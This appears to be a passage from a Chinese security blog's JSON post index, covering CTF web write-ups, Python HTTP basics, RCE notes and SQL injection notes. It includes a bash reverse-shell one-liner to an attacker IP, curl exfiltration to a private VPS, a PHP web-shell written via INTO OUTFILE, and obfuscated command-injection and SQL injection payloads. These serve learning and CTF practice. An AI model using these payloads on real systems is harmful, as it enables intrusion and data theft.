PDO('mysql:host=localhost;dbname=ctftraining', 'root','root');\n  foreach($dbh->query('select load_file(\"/flag36.txt\")') as $row)\n\t{\n    echo($row[0]); \n  }\n  $dbh = null;\n}\ncatch (PDOException $e) \n{\n  echo $e->getMessage();\n  exit(0);\n}\nexit(0);\n```\n\n拓展PDO知识：\n\n```PHP\nPHP 数据对象 （PDO） 扩展为PHP访问数据库定义了一个轻量级的一致接口。\nPDO 提供了一个数据访问抽象层，这意味着，不管使用哪种数据库，都可以用相同的函数（方法）来查询和获取数据。\nPDO随PHP5.1发行，在PHP5.0的PECL扩展中也可以使用，无法运行于之前的PHP版本。\n一个实例\n<?php\n$dbms='mysql';     //数据库类型\n$host='localhost'; //数据库主机名\n$dbName='test';    //使用的数据库\n$user='root';      //数据库连接用户名\n$pass='';          //对应的密码\n$dsn=\"$dbms:host=$host;dbname=$dbName\";\n\ntry {\n    $dbh = new PDO($dsn, $user, $pass); //初始化一个PDO对象\n    echo \"连接成功<br/>\";\n    /*你还可以进行一次搜索操作\n    foreach ($dbh->query('SELECT * from FOO') as $row) {\n        print_r($row); //你可以用 echo($GLOBAL); 来看到这些值\n    }\n    */\n    $dbh = null;\n} catch (PDOException $e) {\n    die (\"Error!: \" . $e->getMessage() . \"<br/>\");\n}\n//默认这个不是长连接，如果需要数据库长连接，需要最后加一个参数：array(PDO::ATTR_PERSISTENT => true) 变成这样：\n$db = new PDO($dsn, $user, $pass, array(PDO::ATTR_PERSISTENT => true));\n\n?>\n```\n\n##### 76\n\n同上改名字\n\n##### 77\n\n首先还是扫目录，文件名flag36x.txt，尝试上题方法发现数据库消失，看提示是PHP7.4以上的新特性，可以通过新建一个FFI对象来执行系统命令，又因为执行系统命令后没有回显，所以我们把执行后的结果放到网站目录下的一个文本文件中进行读取\n\n```php\npayload:\nPOST\nc=$ffi = FFI::cdef(\"int system(const char *command);\");\n$a='/readflag > /var/www/html/1.txt';\n$ffi->system($a);\n```\n\n然后访问/1.txt即可\n\n##### 118\n\n首先查看源码，发现输入被包含到system函数中执行，尝试`echo，whoami，ls，cat`全部失效想方法绕过，输入空格发现可以执行，所以可以尝试通过构造系统变量来执行，查看提示的图片\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-03-21 16.39.03.png)\n\n发现是默认配置文件下的文件名列表，可以通过剪裁构造变量，读取文件命令最容易进行构造的就是`nl`，想拼接出nl只需要取系统配置变量最后一位n和当前执行目录最后一位l即可，最终payload如下\n\n```\npayload:${PATH:~0}${PWD:~0}$IFS????.???\n```\n\n发现还是不行，是因为过滤了数字，没关系，剪裁字符还可通过大写字母解决，真·最终payload如下\n\n```\npayload:${PATH:~A}${PWD:~A}$IFS????.???\n```\n\n**系统变量补充知识**\n\n```\n$PATH 系统配置变量\n$PWD 当前执行目录\n$HOME 默认进入的目录\n$SHELL\n$USER 当前user\n$SHLVL 代表当前shell窗口的深度，一般为1\n$PHP_CFLAGS 指定头文件（.h文件）的路径，如：CFLAGS=-I/usr/include -I/path/include。同样地，安装一个包时会在安装路径下建立一个include目录，当安装过程中出现问题时，试着把以前安装的包的include目录加入到该变量中来。\n$PHP_VERSION PHP版本\n\n```\n\n**Linux变量补充知识**\n\n```\n${变量名:从哪一位开始取:取多长}，如没有长度默认取到最后，如果没有起始位就从头开始\n${#变量名}，代表这个变量的长度\n$\n```\n\n##### 119\n\n先尝试上一把的是否可行，不行所以直接看提示吧，系统变量的知识补充在上一道题了，针对本题\n\n```\nSHLVL的值为2，#SHLVL的值为1，从PHP_VERSION的第二位取一个为3，也就是${PHP_VERSION:${SHLVL}:${#SHLVL}}为3，最终取\nPHP_CFLAGS变量从第三位开始的前三个即可构造tac\n```\n\n最终payload如下\n\n```\npayload:${PHP_CFLAGS:${PHP_VERSION:${SHLVL}:${#SHLVL}}:${PHP_VERSION:${SHLVL}:${#SHLVL}}} ????.???\n```\n\n##### 120\n\n上一把的字符太长了，只能通过别的命令读取了\n\n```\ntips：Linux中的base64在/bin目录之下，base64 文件名即可将文件进行base64编码\n```\n\n所以我们最终构造出结果为/bin/base64 flag.php即可\n\n首先是/字符，PWD首位，而后bin可使用通配符，尝试base64也使用通配符不可行，所以我们尝试构建出数字4来匹配\n\n```\ntips：RANDOM变量能生成一万以内的随机数，用#取长度即可有概率得到4\n```\n\n最终payload\n\n```\npayload:\nPOST\ncode=${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?????${#RANDOM} ????.???\n```\n\n~~多刷新几次总会出来的~~\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-03-21 19.36.51.png)\n\n##### 121\n\n尝试上题payload，发现SHLVL被过滤了，所以我们需要一个1\n\n```\ntips:通过$?来实现的，$?是表示上一条命令执行结束后的传回值。通常0代表执行成功，非0代表执行有误\n```\n\n所以我们使用${#?}即可构造出1，最终payload如下\n\n```\npayload:\nPOST\ncode=AAAAAAAAA\ncode=${PWD::${#?}}???${PWD::${#?}}?????${#RANDOM} ????.???\n```\n\n##### 122\n\n滤了PWD但是有HOME，HOME替换PWD就行，滤了#号没发去长度，RANDOM取一位即可，随机到了就是胜利\n\n```\npayload:\nPOST\ncode=A;${PWD::${?}}???${PWD::${?}}?????${RANDOM} ????.???\n```\n\n**124**\n","tags":["CTF","web"]},{"title":"Python于web层应用","url":"/posts/4256.html","content":"\n# Python于web层应用\n\n## HTTP协议基础\n\n### 协议分类\n\nHTTP 1.0 80端口 单次一个链接\n\nHTTP 1.1 80端口 多次可一个链接\n\nHTTP协议不够安全，进而发展出了HTTPS协议\n\nHTTPS 443端口 加密后数据传输\n\n<!--more-->\n\n### 请求方法\n\n###### HTTP 1.0\n\nGET POST HEAD\n\n###### HTTP 1.1与HTTPS\n\nOPTIONS PUT DELETE TRACE CONNECT PATCH\n\n### URL格式\n\n协议://主机名.域名/文件夹/文件?参数=值&参数=值\n\n### HTTP请求头\n\nUser-Agent：浏览器版本信息\n\nAccept-encoding：浏览器接受的编码\n\nReferer：当前网页跳转来源\n\nCookie：顾名思义，~~好吃的饼干，~~Cookie信息\n\nLocation：跳转到哪里\n\nSet-Cookie：设置Cookie信息\n\nWWW-Authenticate：用于身份验证HTTP Basic等\n\n### HTTP响应状态码\n\n1XX：信息提示\n\n2XX：成功\n\n3XX：重定向\n\n4XX：客户端错误\n\n5XX：服务端错误\n\n### 查看HTTP\n\n使用浏览器审查进行查看\n\n使用Burpsuite截断查看\n\n## Python使用HTTP请求\n\n###### GET请求\n\n不带参数`requests.get(url)`\n\n带参数`requests.get(url=url,params={\"key1\":\"value1\",\"key2\":\"value2\"})`\n\n返回的对象r.url获取url\n\n###### POST请求\n\n不带参数`requests.post(url)`\n\n带参数`requests.post(url=url,data={\"key1\":\"value1\",\"key2\":\"value2\"})`\n\n###### 自定义请求头\n\nheaders={key1:value1,key2:value2}\n\nrequests.get(url=url,headers=headers)\n\n###### 其他请求\n\nrequests.put(url,data)\n\nrequests.delete(url)\n\nrequests.head(url)\n\nrequests.options(url)\n\n## Python处理HTTP响应\n\n**获取相应状态码：**r.status_code\n\n**获取响应文本：**r.content（获取到二进制内容）r.text（获取原始文本代码）\n\n**获取相应头：**r.headers\n\n**获取请求头：**r.reuqests.headers\n\n**获取请求URL：**r.url\n\n**获取Cookie：**r.cookies\n\n## Python设置HTTP代理\n\n**代理设置：**http和https:`proxies={'http':'http://代理服务器:代理端口','https':'https://代理服务器:代理端口'}`\n\n**参数设置：**`proxies=proxies,verfiy=False`\n\n## Python会话编程\n\n通过Set-Cookie设置一个cookie值\n\n使用`s=requesets.Session()`建立一个新的空会话\n\n`r=s.get(url)`来在会话中发起个体请求\n\n## Python制作目录扫描工具\n\n###### 目录扫描原理\n\n1、读取字典文件拼接URL\n\n2、通过get请求访问URL\n\n3、获取状态码判断目录是否存在\n\n###### 字典文件读取\n\n1、`with open(\"filename.txt\",\"r\") as f:`\n\n2、读取方式：\n\n- `f.readline()//读取一行`\n- `f.readlines()//逐行读取到一个列表中`\n- `f.read(字节数)//按字节读`\n- `line.strip()//去除空行`\n\n3、`f.close()`关闭文件流\n\n4、sys库中的sys.argv[0]为当前python文件绝对路径，sys.argv[1]为传入第一个参数\n\n5、User-Agent通过抓包先获取真实的User-Agent，再通过headers字典传入get请求\n\n## IIS PUT漏洞\n\nIIS中拓展工具WebDAV支持HTTP方法，也提供了一些其他功能强大的方法（Move），使得开启WebDAV可以直接上传任意文件\n\n**探测方法：**通过HTTP中options方法可以探测出服务器支持的HTTP方法\n\n**探测过程：**\n\n- 确定目标主机\n- 使用HTTP options方法探测\n- 查看返回结果中是否存在MOVE PUT\n- 查看响应头中的PUBLIC属性\n\n## 探测服务器信息\n\n相应头中的Server：服务器中间件属性\n\nX-Powered-By：服务器脚本技术\n\n## Python制作漏洞检测工具\n\n首先了解漏洞产生原理，根据漏洞原理写出对应的POC代码来验证漏洞是否存在\n\n## 构建站点地图\n\n测试Web App的首要任务就是获取站点完整的目录和文件\n\n###### 技术种类：建议使用两种方式同时进行\n\n1、通过基于字典的目录文件扫描\n\n2、通过基于网络爬虫的技术（可通过requests库构建，但是很复杂，有scrapy库可用于构建爬虫）\n\n3、通过Burpsuite构建网站地图\n","tags":["web"]},{"title":"Python基础","url":"/posts/14702.html","content":"\n# Python基础\n\n#### 数据类型：\n\nstring（字符串）\n\nnum（数字）\n\nbool（布尔）\n\nlist（列表）使用[    ]定义\n\ntuple（元组）使用{     }定义（无序）\n\ndictionary（字典）使用{     }定义，内容为：下标名:元素内容\n\n<!--more-->\n\n#### 字符串相关函数：\n\n###### 查找：\n\n```python\nstr.find(str1,start,end)//rfind从末尾开始查找\nstr.index(str1,start,end)//rindex从末尾开始查找\n```\n\n在字符串中查找是否存在str1，存在返回第一次出现的位置，不存在find返回-1，index报错\n\n```python\nstr.count(str1,start,end)\n```\n\n查找字符串中某字符串出现的次数\n\n###### 替换：\n\n```python\nstr.replace(old,new,count)\n```\n\n将字符串中old内容替换为new，count为最大替换次数，返回新字符串，不改变原来字符串\n\n###### 切割：\n\n```python\nstr.split(str1,count)\n```\n\n将字符串以str1为分隔切割，count为最大切割次数，返回一个列表，不改变原有字符串，默认按空白字符进行全切割\n\n###### 加入：\n\n```python\nstr.join(可迭代对象)\n```\n\n将str插入到可迭代对象两个元素之间，返回一个字符串\n\n###### 乱七八糟：\n\n```python\ncapitalize(str)//将字符串中第一个字母大写\ntitle(str)//字符串中每个单词首字母大写\nstr.startwith(str1)//检查字符串是否以str1开头\nstr.endwith(str1)//检查字符串是否以str1结尾\nstr.upper()//字母全大写\nstr.lower()//字母全小写\n```\n\n\n\n\n\ninput输入\n\nprint输出\n\nread读文件（按字节读），readline（按行读）\n\nopen(\"文件名\"，\"打开方式（r只读，w写入，a追加，（b）代表以二进制打开，（+）代表读写）\"，encoding=\"编码方式\")打开文件（以二进制进行读写时不能指定encoding方式）\n\n*args不定长参数，接收后生成元组\n\n**kwargs不定长参数，接收后生成字典\n\n#### Python内存管理机制：引用计数\n\n```python\na=1 #a地址引用为1\nb=a #a地址引用为2\ndel a #a地址引用为1\ndel b #a地址引用为0，此时a引用地址被销毁\n```\n\n","tags":["Python"]},{"title":"RCE远程代码执行","url":"/posts/47881.html","content":"\n# **RCE远程代码执行**\n\n#### **一、RCE能做到什么：**\n\n1、执行系统命令 2、记录用户输入 3、控制键盘鼠标 4、任意上传下载 5、截屏\n\n<!--more-->\n\n#### **二、RCE产生原因：**\n\n1、服务器上有木马 \n\n2、脆弱服务未授权\n\n3、通过数据库写木马 \n\n4、文件上传/文件包含 \n\n5、危险函数（eval，assert，system，shell_exec，exec，file_put_contents） \n\n6、命令执行 \n\n7、反序列化\n\n#### **三、RCE远程代码执行关键点：**\n\n##### **1、RCE黑名单过滤：**\n\nlinux执行命令特殊字符：（;分割命令）（&&在前一个命令执行成功的前提下执行后面命令）（||前一个命令执行失败的前提下执行后面命令）（|将前面命令执行的结果作为输入，输入到后面命令中执行）（``将命令执行结果作为命令再次执行）（$()和前一个一样）\n\n过滤空格后可使用<向命令传入参数，${IFS}为空格，%0a为分号转译\n\n`cat绕过可使用tac more less head tac tail nl od(二进制查看) vi vim sort uniq`\n\n`绕过空格用%09 <> ${IFS} $IFS$9 {cat,fl*} %20`\n\n`flag绕过可使用通配符f*`\n\n##### **2、RCE无回显：**\n\n（1）、反弹shell：攻击端监听一个端口如：2333 \n\n​\t攻击端使用：\n\n```shell\nnc -lvp 监听的端口\n```\n\n​\t受害端使用如下命令生成一个反弹shell：\n\n```shell\nbash -i >& /dev/tcp/攻击端IP/攻击端监听端口 0>&1\n```\n\n​\t在攻击端终端即可在受害端中执行命令\n\n（2）、dnslog：通过ping $(命令).域名 通过这种方式获取命令执行结果\n\n（3）、写文件：将命令执行结果写入到文件中，使用echo命令：\n\n```shell\necho \"写入内容\">test.txt\n```\n\n（4）、curl等网络命令：通过POST等方式直接给到个人私有VPS中\n\n```shell\ncurl -d \"key1=value1&key2=value2&key3=value3\" protocol://ip:port/path\n```\n\n##### **3、RCE后发现不出网**\n\n（1）、写文件\n\n（2）、命令盲注：命令||sleep 100\n\n（3）、隐蔽信道\n\n##### 4、字符绕过\n\n（1）、\n\n```\n使用''或\"\"隔断字符串\n```\n\n（2）、空格可使用：<，<>，${IFS}，$IFS，%20(space)，%09(tab)，$IFS$9，$IFS$1 替换\n\n（3）、分号可使用：%0a，%0d，%0D，%0A 替换\n\n（4）、使用base64编码：Y2F0IGZsYWcucGhw|base64，将其中内容解码后执行\n\n（5）、使用`反引号包裹命令，将其中内容作为前一命令的输入\n\n##### 5、可用于执行系统命令的函数\n\nexec()、passthru()、system()、shell_exec()\n\n\n\n\n\n","tags":["Note","web","RCE"]},{"title":"SQL注入笔记","url":"/posts/26213.html","content":"\n# **SQL注入**\n\n1、通过order by爆出字段数\n\n2、union操作，联合查询，查询的是在同一个数据表的数据，通过union select 1,2,3…,n来判断回显位置\n\n3、information_schema数据库，为mysql自带数据库，提供数据库源数据访问，最常用的是\n\n**TABLES表**：提供了关于数据库中表的信息\n\n**COLUMNS表**：提供了表中列的信息\n\n<!--more-->\n\n爆破库名：\n\n```mysql\nunion select 1,2,database()\n//靠错误爆出库名\nand exists(select * from aaa)\n//aaa表并不存在，此时会报错停止并返回数据库名.aaa\n```\n\n爆破表名：\n\n```mysql\nunion select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()\nand exists(select * from 表名)//爆破出表名\n```\n\n爆破列名：\n\n```mysql\nunion select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\"想查询的表名\"\nand exists(select 列名 from 已知表名)//爆破出列名\n```\n\n4、报错注入\n\n（1）updatexml：更新XML文档的函数\n\n语法：**updatexml（文档类型，xpath路径，更新的内容）**\n\n例子：\n\n```mysql\nand updatexml(0x0a,concat(0x0a,(select database())),’1’)\n```\n\n0x0a代表换行符，concat拼接\n\n拼接目的为使得查询结果能完全显示出来\n\n（2）extractvalue：对XML文档进行查询的函数\n\n语法：**extractvalue（文档类型，xpath路径）**\n\n报错原理：路径中写入不合法的格式，就会报错并且返回我们写入的非法格式内容，我们可以利用这个得到我们想得到的内容\n\n```mysql\nand (select extractvalue(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema= 'sqli'))))\n```\n\n提示：报错最长显示30个字符内容，如果内容过长可使用substr函数进行拆分\n\n​\t例题：CTFHub技能树web-SQL注入-报错注入\n\n​\t![SQLError](/images/quiz/SQLError.png)\n\n​\t首先爆破库表列名\n\n​\t![SQLError2](/images/quiz/SQLError2.png)\n\n​\t进而发现flag过长用substr切割\n\n​\t![SQLError3](/images/quiz/SQLError3.png)\n\n​\t得到flag\n\n5、盲注：\n\n布尔盲注：回显只有两种情况，一种有一种无\n\nif表达式：if(expr1,expr2,expr3)\n\nexpr1为真就返回expr2（可用于执行函数）\n\nsubstr函数：substr(字符串,起始位置,截取长度)\n\nascii函数：将函数内字符以ascii表转换为数字，而后可以进行判断\n\n\n\n时间盲注：无回显，可以通过sleep函数判断是否为时间盲注\n\n~~建议直接sqlmap~~\n\n（1）、sleep函数看延迟时间\n\n（2）、benchmark(执行次数,方式)，执行超多次看延迟时间\n\n6、堆叠注入：通过语句分割符号（  ;  ）分隔多条语句，直接将想要的数据插入到表中，然后再通过查询语句读取\n\n7、mysql文件读写：读取：load_file函数：load_file(‘文件路径’)\n\n写入：\n\n```mysql\nselect ‘<?php eval($_POST[cmd]);?>’ into outfile或dumpfile '绝对路径';//建议用dumpfile，因为outfile会在文件末行写入新行，使用的转译换行符，会破坏文件完整性，可能导致一句话木马无法执行\n```\n\n8、关键词绕过：通过\n\n（1）、set@a：设定一个语句变量 set@sql=0x16进制数\n\n（2）、prepare : 存储一个sql语句 存到execsql 里面 prepare execsql from @sql\n\n（3）、execute :执行一个sql语句 execute execsql\n\n由于设定语句变量时，mysql会自动将16进制数据转换为文字\n\n9、零碎\n\n```mysql\nto_base64(内容)//该语句将内容经过base64编码后输出\nreplace(ori,old,new)\n```\n\n```\n%0a,/**/可代替空格\n```\n\n```\n--+，%23，#将后面的语句注释\n```\n\n10、SQL约束攻击\n\n在SQL中执行字符串处理时，字符串末尾的空格符将会被删除。例如如下代码：\n\n```sql\nSELECT userId from user where username = 'test            '//看这里有很多空格\n```\n\n上述代码和username = 'test'结果是一样的。但也存在异常情况，最好的例子就是LIKE子句了。注意，对尾部空白符的这种修剪操作，主要是在“**字符串比较**”期间进行的。这是因为，**SQL会在内部使用空格来填充字符串**，**以便在比较之前使其它们的长度保持一致**。\n\n在所有的INSERT查询中，SQL都会根据varchar(n)来限制字符串的最大长度。也就是说，如果字符串的长度大于“n”个字符的话，那么仅插入字符串的前“n”个字符。比如特定列的长度约束为“5”个字符，那么在插入字符串“testName”时，实际上只能插入字符串的前5个字符，即“testN”。\n\n```php\n//注册示例代码\n<?php\n$username = mysql_real_escape_string($_GET['username']);\n$password = mysql_real_escape_string($_GET['password']);\n$query = \"SELECT *\n          FROM users\n          WHERE username='$username'\";\n$res = mysql_query($query, $database);\nif($res) {\n  if(mysql_num_rows($res) > 0) {\n  }\n  else {\n    $query = \"INSERT INTO users(username, password)\n?>\n```\n\n这里注册时使用用户名+【大量空格】和随机密码注册即可完成攻击。\n\n主要原理就是insert时候有varchar(n)的限制，大于n的时候会截取前n个存入。在数据库对字符串进行比较时，即select操作，如果两个字符串的长度不一样，则会将较短的字符串末尾填充空格，使两个字符串的长度一致。注册时select语句不会将\"admin+[大量空格]11\"删减到n位，所以不会被select查出与admin重复，不会返回数据，接下来就可以插入admin+[空格]（截取）11和自定义密码了。\n\n如果使用用户名“vampire”和密码“random_pass”登录的话，对比时是admin与admin+[大量空格]，会将前面的admin添加空格与后面的长度相同在进行对比，那么返回的只能是我们自己注册的用户信息，而不会返回目标用户信息。SQL查询语句是一个and操作，如果密码不一样怎么会把目标用户的信息也返回回来?\n\n当登陆时使用admin与自定义密码登陆，数据库将返回我们自己注册的账户信息，但是注意此处的return $username，虽然此时查询出来的是我们自己的用户信息，但是返回的用户名则是目标的用户名。如果此后的业务逻辑直接以该用户名为准，则我们就达到了水平越权的目的。\n\n\n\n\n\n**HANDLER语句查询**\n\n出自该题[GYCTF2020]Blacklist，类似于某道堆叠注入的进阶版，但是该题过滤太多了，之前那道题的payload完全不可用了\n\n```\nreturn preg_match(\"/set|prepare|alter|rename|select|update|delete|drop|insert|where|\\./i\",$inject);\n```\n\n知识点：handler语句查询\n\n```mysql\n\nHANDLER tbl_name OPEN [ [AS] alias]\n \nHANDLER tbl_name READ index_name { = | <= | >= | < | > } (value1,value2,...)\n    [ WHERE where_condition ] [LIMIT ... ]\nHANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST }\n    [ WHERE where_condition ] [LIMIT ... ]\nHANDLER tbl_name READ { FIRST | NEXT }\n    [ WHERE where_condition ] [LIMIT ... ]\n \nHANDLER tbl_name CLOSE\n\n```\n\n构造出语句如下\n\n```\npayload:\n1';use supersqli;handler FlagHere open;handler FlagHere read first;handler FlagHere close;#\n```\n\n\n\n\n\n\n\ndistinct+列名可以去除重复值\n","tags":["Note","web","SQL"]},{"title":"CTF零碎笔记","url":"/posts/11612.html","content":"\n# 零碎笔记\n\nmt_srand( )该函数在PHP4.2.0之前传入任意参数后生成的都是伪随机数，在任何机器上只要运行的同样的seed参数结果都相同，有工具可以爆破\n\n<!--more-->\n\nKindEditor编辑器漏洞，在使用该编辑器是在url末尾加上/php/file_manager_json.php?path=路径，就会便利路径中所有内容，特征为前端代码中有对php/file_manager_json.php的引用\n\n###### md5弱相等绕过：\n\n1、构造数组a[]=xxxx&b[]=xxxx\n\n2、弱相等时转换为相同数据类型，0e开头的字符串会被转为0，字符串如下\n\n```\nQNKCDZO//0e830400451993494058024219903391\ns878926199a//0e545993274517709034328855841020\ns155964671a//0e342768416822451524974117254469\ns214587387a//0e848240448830537924465865611904\ns214587387a//0e848240448830537924465865611904\ns878926199a//0e545993274517709034328855841020\ns1091221200a//0e940624217856561557816327384675\n```\n","tags":["Note","web"]},{"title":"CTF","url":"/posts/58958.html","content":"\nJlan的CTF之旅从现在开始了\n\n","tags":["Note"]}]